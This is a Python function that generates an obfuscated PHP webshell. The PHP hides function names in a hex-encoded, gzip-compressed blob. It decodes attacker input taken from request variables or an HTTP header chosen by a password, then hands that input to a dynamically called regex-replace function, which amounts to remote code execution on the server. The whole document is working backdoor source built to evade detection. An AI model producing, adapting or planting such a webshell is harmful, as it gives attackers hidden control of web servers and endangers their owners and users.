def get_php(keyword: int = 4, passwd: str = "", salt: str = ""):
    return """<?php
function dept($data,$salt="%s",$change=0x80){$data=base64_decode($data);$saltm = md5($salt);$len = strlen($data);$pass=strrev(str_rot13(substr(strrev($data^str_repeat($saltm,ceil($len / 32)) ^ str_repeat(chr($change),$len)),0,-32)));return $pass;}

class User{
    private $hash = 'cb4d4a2d4a4d8f2f4a2dc8494c4ead71f7f17772f409aec94d2daa8977770da9890ff00f0692cefefede9eae352a0589c5c5b62af1c1ae4161ae41d100';
    private $potions = true;
    private $username = true;
    private $config = null;
    function __construct($options,$username,$config=null){
        $this->options = $options;
        $this->username = $username;
        $this->config = $config;
    }
    function __toString(){
        preg_match_all('/[\\S\\s]{2}/i',$this->hash,$zip,2);
        foreach($zip as $hex){
            $dzip.=chr(hexdec($hex[0]));
        }
        $name = explode('|',gzinflate($dzip));
        return $name[$this->options];
    }
    function __destruct(){
        if($this->username){
            $pass = in_array($this->options,array(3,4,5)) ? $this->config[(string)new User($this->options,0)][%s] : (string)new User($this->options,0).'HTTP_%s];';
            $user = (string) new User(0,0);
            if(isset($pass)){
                if($this->options==6){
                    $user('.*','\\0',$pass,(string) new User(2,0));
                }
                $user('.*','\\0',dept($pass),(string) new User(2,0));
                }
            }
        }
    }
new User(%s,1,$GLOBALS);""" % (salt, passwd, passwd.upper(), keyword)
